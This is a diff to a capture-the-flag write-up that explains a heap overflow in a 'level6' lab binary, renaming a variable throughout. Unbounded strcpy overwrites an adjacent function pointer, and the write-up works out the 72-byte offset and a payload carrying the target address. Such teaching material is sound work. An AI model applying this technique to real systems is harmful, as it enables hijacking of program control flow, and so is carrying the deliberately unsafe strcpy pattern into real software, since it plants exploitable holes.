@@ -22,15 +22,23 @@ void m(void)
 int main(int argc, char **argv)
 {
   char *buffer;
-  void (**func_ptr)(void);
+  void (**function_pointer)(void);
   
-  buffer = (char *)malloc(64);                  // Heap allocation 1
-  func_ptr = malloc(4);                         // Heap allocation 2
-  *func_ptr = m;                                // Points to m() initially
+  // Allocate 64 bytes for buffer on the heap
+  buffer = (char *)malloc(64);
   
-  strcpy(buffer, argv[1]);                      // ⚠️ VULNERABILITY! No bounds check
+  // Allocate 4 bytes for function pointer on the heap
+  function_pointer = (void (**)(void))malloc(4);
   
-  (*func_ptr)();                                // Calls whatever func_ptr points to
+  // Set function pointer to point to m() by default
+  *function_pointer = m;
+  
+  // Vulnerable: No bounds checking! Can overflow buffer into function_pointer
+  strcpy(buffer, argv[1]);
+  
+  // Call whatever function the pointer points to
+  (*function_pointer)();
+  
   return 0;
 }
 ```
@@ -42,12 +50,12 @@ int main(int argc, char **argv)
 | **Function `n()`** | `0x08048454` | Target - prints flag |
 | **Function `m()`** | `0x080484b4` | Decoy - prints "Nope" |
 | **Buffer (heap)** | `0x0804a008` | 64 bytes, vulnerable |
-| **func_ptr (heap)** | `0x0804a050` | 4 bytes, our target |
+| **function_pointer (heap)** | `0x0804a050` | 4 bytes, our target |
 
 **Key Observations:**
-- Both buffer and func_ptr are on the **HEAP** (via malloc)
+- Both buffer and function_pointer are on the **HEAP** (via malloc)
 - strcpy has **no bounds checking**
-- func_ptr is **always called** after strcpy
+- function_pointer is **always called** after strcpy
 - n() exists but is **never called normally**
 
 ## 🚨 The Challenge
@@ -56,21 +64,21 @@ This is our first **pure heap overflow** - both the vulnerable buffer and the ta
 
 **The Setup:**
 ```c
-buffer = malloc(64);        // Heap allocation 1
-func_ptr = malloc(4);       // Heap allocation 2 (consecutive!)
-*func_ptr = m;              // Points to m() initially
-strcpy(buffer, argv[1]);    // OVERFLOW! No size limit
-(*func_ptr)();              // Calls whatever func_ptr points to
+buffer = malloc(64);                // Heap allocation 1
+function_pointer = malloc(4);       // Heap allocation 2 (consecutive!)
+*function_pointer = m;              // Points to m() initially
+strcpy(buffer, argv[1]);            // OVERFLOW! No size limit
+(*function_pointer)();              // Calls whatever function_pointer points to
 ```
 
 **The Problem:**
 - Buffer is limited to 64 bytes
 - strcpy copies until NULL terminator (no bounds check)
 - If argv[1] is longer than 64 bytes → **overflow**
-- Overflow can reach func_ptr
+- Overflow can reach function_pointer
 
 **The Goal:**
-Overflow the buffer to overwrite func_ptr, redirecting execution from m() to n().
+Overflow the buffer to overwrite function_pointer, redirecting execution from m() to n().
 
 ## 🎯 How the Exploit Works
 
@@ -101,7 +109,7 @@ Using `ltrace` to see malloc addresses:
 $ ltrace ./level6 AAAA
 
 malloc(64)   = 0x0804a008  ← buffer starts here
-malloc(4)    = 0x0804a050  ← func_ptr starts here
+malloc(4)    = 0x0804a050  ← function_pointer starts here
 strcpy(0x0804a008, "AAAA") = 0x0804a008
 ```
 
@@ -110,7 +118,7 @@ strcpy(0x0804a008, "AAAA") = 0x0804a008
 0x0804a050 - 0x0804a008 = 0x48 = 72 bytes
 ```
 
-This tells us we need **72 bytes of padding** to reach func_ptr!
+This tells us we need **72 bytes of padding** to reach function_pointer!
 
 ### Visual: Heap Memory Layout
 
@@ -125,7 +133,7 @@ INITIAL STATE:
             │ Heap metadata (8 bytes)                    │
             │ [size, flags, management info]             │
 0x0804a050: ├────────────────────────────────────────────┤
-            │ func_ptr (4 bytes)                         │
+            │ function_pointer (4 bytes)                 │
             │ [0x080484b4] → points to m()               │
             └────────────────────────────────────────────┘
 
@@ -157,7 +165,7 @@ strcpy(buffer, argv[1]);
 **In our case:**
 - Source: argv[1] (user-controlled, can be any length)
 - Destination: buffer (64 bytes on heap)
-- Adjacent target: func_ptr (72 bytes away)
+- Adjacent target: function_pointer (72 bytes away)
 
 ### The Attack Strategy
 
@@ -170,7 +178,7 @@ strcpy(buffer, argv[1]);
 **Step 2: Calculate Payload**
 ```
 [Padding: 72 bytes] + [Address of n(): 4 bytes]
-     └─ Fill buffer and metadata       └─ Overwrite func_ptr
+     └─ Fill buffer and metadata       └─ Overwrite function_pointer
 ```
 
 **Step 3: Build Payload**
@@ -200,11 +208,11 @@ Command: ./level6 "AAAA...AAAA\x54\x84\x04\x08"
 
 Step 2: Heap Allocations
 ─────────────────────────
-malloc(64):  buffer   = 0x0804a008
-malloc(4):   func_ptr = 0x0804a050
+malloc(64):  buffer           = 0x0804a008
+malloc(4):   function_pointer = 0x0804a050
 
 Initial state:
-  *func_ptr = 0x080484b4 (address of m)
+  *function_pointer = 0x080484b4 (address of m)
 
 
 Step 3: Vulnerable strcpy()
@@ -213,17 +221,17 @@ strcpy(buffer, argv[1]):
   Copies 76 bytes from argv[1]:
     - Bytes 0-63:   → buffer (0x0804a008 to 0x0804a047)
     - Bytes 64-71:  → heap metadata (0x0804a048 to 0x0804a04f)
-    - Bytes 72-75:  → func_ptr (0x0804a050 to 0x0804a053)
+    - Bytes 72-75:  → function_pointer (0x0804a050 to 0x0804a053)
 
 Result:
-  buffer:   [AAAA...AAAA] (72 A's)
-  func_ptr: [0x08048454] ← Overwritten with n()'s address!
+  buffer:            [AAAA...AAAA] (72 A's)
+  function_pointer:  [0x08048454] ← Overwritten with n()'s address!
 
 
 Step 4: Function Pointer Call
 ──────────────────────────────
-(*func_ptr)():
-  1. Dereference func_ptr: reads 0x08048454
+(*function_pointer)():
+  1. Dereference function_pointer: reads 0x08048454
   2. Calls function at 0x08048454
   3. This is n(), not m()!
 
@@ -257,7 +265,7 @@ Output: Flag printed to stdout! 🎉
 
 This is the first **pure heap exploitation**:
 - Vulnerable buffer: **on heap**
-- Target (func_ptr): **on heap**
+- Target (function_pointer): **on heap**
 - No stack manipulation needed!
 
 **Why heap exploits matter:**
